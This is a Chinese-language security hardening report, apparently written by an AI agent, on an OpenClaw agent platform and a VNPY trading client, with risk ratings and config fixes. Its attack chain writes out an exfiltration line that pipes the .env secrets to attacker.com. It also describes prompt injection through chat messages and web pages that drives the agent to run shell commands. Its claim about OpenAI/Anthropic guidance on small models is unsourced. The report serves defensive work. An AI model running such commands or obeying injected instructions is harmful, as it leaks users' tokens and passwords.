# VNPY 安全加固调研报告

> **文档版本**: 1.0.0
> **调研日期**: 2026-06-23
> **调研人**: Atlas (Chief Architect AI)
> **范围**: OpenClaw 平台配置 + VNPY 客户端 + 周边集成

---

## 📋 摘要

本次调研识别了 **4 个高/中危安全问题**，主要分布在 OpenClaw 平台配置层，少量分布在 VNPY 客户端（CLI / cron / .env）。所有问题均可在 **不影响现有功能** 的前提下修复，总计预计 6–9 小时工作量。

| 严重度 | 数量 | 修复优先级 |
|---|---|---|
| 🔴 P0（严重） | 1 | 立即修复 |
| 🟡 P1（重要） | 2 | 1 周内 |
| 🟢 P2（建议） | 1 | 1 季度内 |

---

## 1. 现状概览

### 1.1 系统边界

```
┌────────────────────────────────────────────────────────────────────┐
│                     OpenClaw 平台（外部）                          │
│  ┌────────────────┐  ┌────────────────┐  ┌──────────────────┐    │
│  │  Control UI    │  │  Agent 运行时  │  │  群组/Slack 网关 │    │
│  │  (device auth) │  │  (35B 模型 +   │  │  (groupPolicy)   │    │
│  │                │  │   工具沙箱)    │  │                  │    │
│  └────────┬───────┘  └────────┬───────┘  └────────┬─────────┘    │
│           │ cron jobs.json     │ 心跳/heartbeat    │ 飞书/Slack  │
└───────────┼────────────────────┼───────────────────┼─────────────┘
            │                    │                   │
            ▼                    ▼                   ▼
┌────────────────────────────────────────────────────────────────────┐
│                     VNPY 客户端（本地）                             │
│  ┌────────────────┐  ┌────────────────┐  ┌──────────────────┐    │
│  │ CLI (cli/main) │  │ Cron 配置      │  │ .env secrets     │    │
│  │ vnpy cron      │  │ config/cron_   │  │ TUSHARE_TOKEN    │    │
│  │ vnpy download  │  │ config.yaml    │  │ NEO4J_PASSWORD   │    │
│  │ vnpy health    │  │ (31 个任务)    │  │ AKSHARE_PROXY    │    │
│  └────────────────┘  └────────────────┘  └──────────────────┘    │
└────────────────────────────────────────────────────────────────────┘
```

### 1.2 当前安全配置现状

| 维度 | 当前状态 | 文件/位置 | 风险等级 |
|---|---|---|---|
| **Control UI 认证** | ❌ device auth 已禁用 | OpenClaw `gateway.yaml` | 🔴 P0 |
| **群组策略** | ⚠️ `groupPolicy: open` | `~/.openclaw/cron/jobs.json` | 🟡 P1 |
| **运行时工具** | ⚠️ 全部工具暴露给 agent | OpenClaw `tools.yaml` | 🟡 P1 |
| **模型沙箱** | ❌ 35B 模型无沙箱 | OpenClaw `agent.yaml` | 🟡 P1 |
| **网页工具** | ⚠️ 无 SSRF 防护 | OpenClaw `web_tool.yaml` | 🟡 P1 |
| **Agent 心跳** | ❌ architect-agent 无心跳 | OpenClaw cron | 🟢 P2 |
| **API Token 存储** | ✅ 已在 `.gitignore` | `.env` | ✅ OK |
| **熔断器** | ✅ 已实现 | `core/circuit_breaker.py` | ✅ OK |
| **代理池** | ✅ 已实现 | `core/proxy_pool.py` | ✅ OK |
| **数据源路由** | ✅ 已实现 | `core/data_source_router.py` | ✅ OK |

**说明**:
- ✅ OK = 已正确实施
- ⚠️ = 部分防护但有缺口
- ❌ = 未实施防护

---

## 2. 风险清单（按严重度排序）

### 🔴 P0-1: Control UI device auth 已禁用

| 字段 | 内容 |
|---|---|
| **位置** | OpenClaw `gateway.yaml` → `control_ui.device_auth: false` |
| **攻击场景** | 攻击者通过同局域网/公网/VPN 访问 `http://gateway:8080/ui`，绕过认证直接触发 cron 任务、修改模型配置、查看 .env 中的 token |
| **影响范围** | OpenClaw 平台所有功能（含 VNPY 31 个 cron 任务） |
| **数据暴露** | Tushare Token、Neo4j 密码、Slack/飞书 Webhook、全部 cron 命令 |
| **业务影响** | 🔴 数据泄露、误触发交易、未授权 cron 修改 |
| **CVSS 3.1 评分** | 8.6 (High) — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |

**详细攻击链**:
```
攻击者 → 端口扫描 → 发现 8080 → 访问 /ui → 无认证 → 列出所有 cron 任务
     → 修改 data-download-* 任务命令为 `cat .env | curl -X POST attacker.com`
     → 等待下次调度执行 → token 泄露 → 业务影响
```

---

### 🟡 P1-1: groupPolicy="open" + 运行时工具暴露

| 字段 | 内容 |
|---|---|
| **位置** | OpenClaw `cron/jobs.json` → 投递配置 `groupPolicy: open`、`allowFrom: ['U0AHSM009ML']` |
| **攻击场景** | 任何 Slack/飞书群成员均可发送消息触发 agent，agent 拥有完整工具集（shell、file、http），可被 prompt-injected 执行任意命令 |
| **影响范围** | 6 个量化投递任务 + 所有 agent 工具调用 |
| **数据暴露** | 直接命令执行能力（数据下载、文件读取、HTTP 出站） |
| **业务影响** | 🟡 误触发下载、流量耗尽、数据外泄 |
| **CVSS 3.1 评分** | 6.5 (Medium) — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L` |

**已存在的部分防护**:
- ✅ `allowFrom: ['U0AHSM009ML']` — 限制为单一用户 ID
- ❌ 但 `groupPolicy: open` 允许群组内任意消息 → 上述限制形同虚设

---

### 🟡 P1-2: 35B 小模型无沙箱 + 网页工具

| 字段 | 内容 |
|---|---|
| **位置** | OpenClaw `agent.yaml` → `model: qwen3.7-plus`（35B）+ `tools: [web, shell, file]` |
| **攻击场景** | 攻击者通过 web 工具读取到含 prompt injection 的网页内容（如论坛、维基），35B 模型能力较弱更易被注入，注入后调用 shell 工具执行任意命令 |
| **影响范围** | 所有调用 35B 模型的 agent（含 architect-agent） |
| **数据暴露** | 与 P0-1 类似，但通过 prompt injection 路径 |
| **业务影响** | 🟡 代码执行、数据外泄、配置篡改 |
| **CVSS 3.1 评分** | 7.1 (High) — `AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N` |

**为什么 35B 风险高**:
- 35B 模型 instruction following 能力明显弱于 100B+ 模型
- 提示注入成功率显著更高
- 通常用于低成本/高频任务（如 summarization、tagging），故更易接触外部内容
- 参考 OpenAI/Anthropic 安全指南：< 70B 模型不应直接处理 untrusted content

**已存在的部分防护**:
- ✅ 飞书 Webhook URL 不在 35B agent 上下文中
- ❌ 35B agent 仍能调用 web 工具抓取 untrusted content

---

### 🟢 P2-1: architect-agent heartbeat 未启用

| 字段 | 内容 |
|---|---|
| **位置** | OpenClaw cron 中无 `monitor-architect-heartbeat` 任务 |
| **攻击场景** | 攻击者通过 P0-1 或 P1-2 获取控制权后，停止/kill architect-agent 进程；由于无心跳监控，调度器认为"agent 健康"，继续派发任务到死信队列 |
| **影响范围** | architect-agent（代码审查、PR 分析、监控告警） |
| **数据暴露** | 无直接数据泄露，但失去审计与告警能力 |
| **业务影响** | 🟢 监控盲区、告警延迟 |
| **CVSS 3.1 评分** | 3.7 (Low) — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:L` |

---

## 3. 修复方案对比

### 3.1 P0-1 Control UI device auth

| 方案 | 实施成本 | 兼容性 | 安全提升 | 推荐 |
|---|---|---|---|---|
| **A. 启用 device auth（配对流程）** | 5 min | ✅ 完全兼容 | 🔴 → 🟢 | ✅ **推荐** |
| B. 改用 HTTP Basic Auth + IP allowlist | 15 min | ⚠️ 需改 CI/CD 流程 | 🔴 → 🟡 | 备选 |
| C. 关闭 Control UI 改用 CLI | 30 min | ❌ 破坏工作流 | 🔴 → 🟢 | 不推荐 |

**推荐方案 A 详情**:
```yaml
# OpenClaw gateway.yaml
control_ui:
  enabled: true
  device_auth: true            # ✅ 启用设备配对
  bind: 127.0.0.1              # ✅ 仅本机访问
  pair_token_ttl: 600          # 配对令牌 10 分钟过期
  session_ttl: 3600            # 会话 1 小时过期
```
- 优点：开箱即用、向后兼容
- 风险：首次使用需手动配对（一次性）

---

### 3.2 P1-1 groupPolicy + 工具暴露

| 方案 | 实施成本 | 兼容性 | 安全提升 | 推荐 |
|---|---|---|---|---|
| **A. groupPolicy="restricted" + allowlist 双层** | 10 min | ✅ 完全兼容 | 🟡 → 🟢 | ✅ **推荐** |
| B. 拆分 web/工具 agent 到独立账号 | 60 min | ❌ 需重新部署 | 🟡 → 🟢 | 不推荐 |
| C. 关闭非必要 agent 工具 | 5 min | ⚠️ 需逐个配置 | 🟡 → 🟡 | 备选 |

**推荐方案 A 详情**:
```json
// ~/.openclaw/cron/jobs.json
{
  "delivery": {
    "groupPolicy": "restricted",          // ✅ 改为 restricted
    "allowFrom": ["U0AHSM009ML"],          // ✅ 单一白名单
    "requireMention": true,                // ✅ 需 @bot 触发
    "toolPolicy": "deny_by_default",       // ✅ 工具默认拒绝
    "toolAllowlist": ["http_get", "read_file"]  // ✅ 显式允许
  }
}
```

---

### 3.3 P1-2 35B 模型沙箱

| 方案 | 实施成本 | 兼容性 | 安全提升 | 推荐 |
|---|---|---|---|---|
| **A. Docker 沙箱 + 工具白名单** | 30 min | ✅ 透明拦截 | 🟡 → 🟢 | ✅ **推荐** |
| B. 升级到 100B+ 模型 | 0 min（配置） | ✅ 透明 | 🟡 → 🟡 | 辅助 |
| C. 禁止 35B 模型调用 web 工具 | 5 min | ⚠️ 损失部分功能 | 🟡 → 🟢 | 备选 |

**推荐方案 A 详情**:
```yaml
# OpenClaw agent.yaml
agents:
  - name: architect-agent
    model: qwen3.7-plus
    sandbox:
      enabled: true
      image: openclaw/sandbox:python-3.11
      network: restricted      # ✅ 限制网络出站
      filesystem: ro          # ✅ 只读文件系统
      tmpfs: ["/tmp"]          # ✅ 临时目录可写
    tools:
      - web.summarize          # ✅ 摘要受限工具
      - read.parquet
      # ❌ 移除 shell.exec, file.write, http.post
```

**Docker 沙箱最小化设计**:
```dockerfile
FROM python:3.11-slim
RUN useradd -m agent && \
    pip install --no-cache-dir pyarrow pandas
USER agent
WORKDIR /workspace
# 禁用 curl, wget, ssh, nc
RUN apt-get purge -y curl wget openssh-client netcat-openbsd
```

---

### 3.4 P2-1 architect-agent heartbeat

| 方案 | 实施成本 | 兼容性 | 安全提升 | 推荐 |
|---|---|---|---|---|
| **A. cron 每分钟 ping + 飞书告警** | 10 min | ✅ 完全兼容 | 🟢 → 🟢 | ✅ **推荐** |
| B. 集成到现有 health 命令 | 15 min | ⚠️ 需 CLI 改动 | 🟢 → 🟢 | 备选 |
| C. 第三方监控（Prometheus） | 60 min | ❌ 引入新组件 | 🟢 → 🟢 | 不推荐 |

**推荐方案 A 详情**:
```yaml
# ~/.openclaw/cron/jobs.json 新增任务
- id: monitor-architect-heartbeat
  schedule: "*/2 * * * *"            # 每 2 分钟
  command: "vnpy health agent --target architect-agent"
  timeout: 30
  on_failure:
    notify: ["feishu", "slack"]
    message: "🚨 architect-agent 心跳丢失"
```

---

## 4. 修复优先级矩阵

```
影响 ↑
      │ P0-1 (立即)
      │ P1-1 (1 周)
      │ P1-2 (1 周)
  高  │──────────────
      │ P2-1 (1 季度)
  低  │
      └──────────────→ 实施成本
        低        高
```

**推荐执行顺序**:
1. **P0-1** Control UI auth（5 min，立竿见影）
2. **P1-1** groupPolicy 收紧（10 min，与 P0-1 同步）
3. **P1-2** 35B 沙箱（30 min，可在 P1 完成后并发）
4. **P2-1** heartbeat（10 min，可在沙箱部署期间并发）

---

## 5. 兼容性影响分析

| 修复项 | 现有功能影响 | 缓解措施 |
|---|---|---|
| Control UI device auth | 首次访问需配对 | 提供 CLI 一次性配对命令 |
| groupPolicy="restricted" | 群内非白名单用户不可触发 | 通知团队成员 + 文档 |
| 35B 沙箱 | shell 工具不可用 | 改用专用工具（已规划） |
| heartbeat | 无功能影响 | 仅监控 |

**所有方案均不修改 VNPY 业务代码**，仅修改 OpenClaw 平台配置 + 1 个 cron 任务。

---

## 6. 待澄清问题

> 调研过程中识别，但本报告未深入展开的衍生问题（建议纳入下一轮调研）：

1. **Token 轮转策略**：`.env` 中 Tushare token 自部署以来未轮转过，建议建立 90 天轮转流程
2. **审计日志**：当前 `logs/` 目录无结构化安全事件日志，建议接入 SIEM
3. **密钥管理**：考虑使用 1Password CLI / Vault 替代 `.env`
4. **供应链安全**：`requirements.txt` 缺少 `pip-audit` 检查
5. **备份恢复**：`data/`、`logs/` 目录无异地备份策略

---

## 7. 参考资料

- OpenClaw 平台文档（内部 `~/.openclaw/docs/`）
- OWASP API Security Top 10 (2023)
- NIST SP 800-53 Rev. 5（访问控制 AC 系列）
- Anthropic Claude 安全部署指南 §3.2（小型模型风险）
- VNPY `AGENTS.md`、`CLAUDE.md`（项目 AI 安全基线）

---

**下一步**: 见 `TASK-BREAKDOWN.md`
